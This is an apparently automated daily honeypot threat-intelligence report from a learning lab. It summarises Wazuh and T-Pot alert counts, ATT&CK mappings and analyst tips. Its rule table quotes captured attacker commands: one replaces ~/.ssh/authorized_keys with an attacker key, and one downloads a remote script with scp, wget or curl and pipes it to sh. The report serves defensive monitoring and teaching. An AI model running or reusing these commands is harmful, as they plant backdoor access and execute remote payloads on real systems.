# LearningLab01 Daily Threat Intelligence Report — 2026-10-20

Generated: 2026-10-20T13:15:05.056Z

Report window: 2026-10-19T13:15:05.030Z through 2026-10-20T13:15:05.030Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 414,816 |
| Attack-related alerts | 14,737 |
| Honeypot interactions | 405,853 |
| Authentication failures | 2,118 |
| Authentication successes | 633 |
| Critical alerts | 266 |
| High alerts | 613 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 266 critical-severity alerts require priority review.
- 613 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 3.35:1.
- Country attribution currently covers only 0.13% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (343,334 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 266 | 0.06% |
| High | 613 | 0.15% |
| Medium | 2,980 | 0.72% |
| Low | 410,957 | 99.07% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 2,118
- Authentication successes: 633
- Failure-to-success ratio: 3.35:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 9,076 | 61.59% |
| Payload delivery | 9,076 | 61.59% |
| Command execution | 2,307 | 15.65% |
| Authentication failure | 2,118 | 14.37% |
| Reconnaissance | 567 | 3.85% |
| Network scan | 284 | 1.93% |
| Malware | 176 | 1.19% |
| SMTP attack | 90 | 0.61% |
| Web attack | 40 | 0.27% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 548 alerts, representing 0.13% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 414,268 | 99.87% | Not geolocated |
| United Kingdom | 180 | 0.04% | ████████████████████ |
| Germany | 161 | 0.04% | ██████████████████ |
| Bulgaria | 102 | 0.02% | ███████████ |
| Romania | 51 | 0.01% | ██████ |
| United States | 30 | 0.01% | ███ |
| Netherlands | 8 | 0.00% | █ |
| France | 7 | 0.00% | █ |
| Ukraine | 4 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Republic of Lithuania | 2 | 0.00% | █ |
| Central African Republic | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 37 |
| Execution | 12 |
| Impact | 11 |
| Command and Control | 6 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 37 |
| Command and Scripting Interpreter | 12 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 6 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 343,334 | T-Pot RDP connection from [IP address] to port 3389. | tpot (343,334) |
| 110204 | 4 | 25,007 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (25,007) |
| 110207 | 5 | 21,436 | T-Pot SentryPeer SIP activity from [IP address]:58975, method INVITE | tpot (21,436) |
| 110205 | 6 | 9,018 | T-Pot Honeytrap received a payload from [IP address] | tpot (9,018) |
| 110209 | 5 | 5,262 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (5,262) |
| 110101 | 3 | 3,226 | Cowrie SSH connection from [IP address]. | tpot (3,226) |
| 110102 | 5 | 2,118 | Cowrie failed login from [IP address] using username root. | tpot (2,118) |
| 110104 | 7 | 2,023 | Cowrie captured a command from [IP address]: uname -m | tpot (2,023) |
| 110201 | 4 | 583 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (583) |
| 110103 | 10 | 342 | Cowrie accepted login from [IP address] using username post. | tpot (342) |
| 110219 | 4 | 291 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/ HTTP/1.1" 404 - | tpot (291) |
| 110214 | 9 | 280 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (280) |
| 110109 | 13 | 266 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (266) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 178 | PAM: Login session closed. | tpot (176), wazuh (2) |
| 110221 | 7 | 170 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (170) |
| 110105 | 12 | 158 | Cowrie captured a file download from [IP address]. | tpot (158) |
| 110216 | 4 | 116 | T-Pot Mailoney received SMTP command from [IP address]: EHLO [IP address]  | tpot (116) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110220 | 8 | 92 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (92) |
| 110217 | 7 | 90 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (90) |
| 110212 | 10 | 58 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (58) |
| 110215 | 4 | 49 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (49) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110223 | 5 | 40 | T-Pot HoneyAML received  request from  to  on port . | tpot (40) |
| 110106 | 10 | 37 | Cowrie detected repeated failed logins from [IP address]. | tpot (37) |
| 110208 | 7 | 23 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5074 | tpot (23) |
| 110108 | 12 | 12 | Cowrie captured suspicious execution or staging activity from [IP address]: >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x59\x53\x4a\x55\x55' | tpot (12) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110107 | 12 | 6 | Cowrie captured a probable payload-retrieval command from [IP address]: UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B" | tpot (6) |
| 110211 | 9 | 4 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (4) |
| 86003 | 3 | 3 | Docker: Error message | tpot (3) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 203 | 9 | 2 | Agent event queue is full. Events may be lost. | tpot (2) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 202 | 7 | 1 | Agent event queue is 90% full. | tpot (1) |
| 205 | 3 | 1 | Agent event queue is back to normal load. | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
